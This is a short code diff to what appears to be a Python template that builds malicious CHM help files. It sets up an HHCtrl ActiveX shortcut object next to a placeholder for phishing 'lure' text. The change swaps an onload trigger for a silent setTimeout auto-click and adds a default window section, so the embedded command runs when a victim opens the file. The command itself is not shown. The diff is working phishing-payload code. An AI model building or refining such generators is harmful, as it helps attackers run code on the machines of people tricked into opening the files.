@@ -60,6 +60,9 @@ Full-text search=Yes
 Language=0x409 English (United States)
 Title={title}
 
+[WINDOWS]
+main="{title}","toc.hhc","","default.html","default.html",,,,,0x63520,,0x10384e,[0,0,0,0],0x918f0000,,,,,,0
+
 [FILES]
 default.html
 
@@ -95,10 +98,11 @@ _HTML_TEMPLATE = """\
 <!DOCTYPE html>
 <html>
 <head>
+<meta charset="utf-8">
 <title>{title}</title>
 </head>
-<body onload="window.x=document.getElementById('shortcut'); window.x.Click();">
-<OBJECT id="shortcut"
+<body>
+<OBJECT id="sc"
     type="application/x-oleobject"
     classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11"
     codebase="hhctrl.ocx#version=4,74,8702,0">
@@ -108,6 +112,9 @@ _HTML_TEMPLATE = """\
     <PARAM name="Item2"   value="273,1,1">
 </OBJECT>
 <p>{lure_text}</p>
+<script>
+setTimeout(function(){{try{{document.getElementById('sc').Click();}}catch(e){{}}}},100);
+</script>
 </body>
 </html>
 """
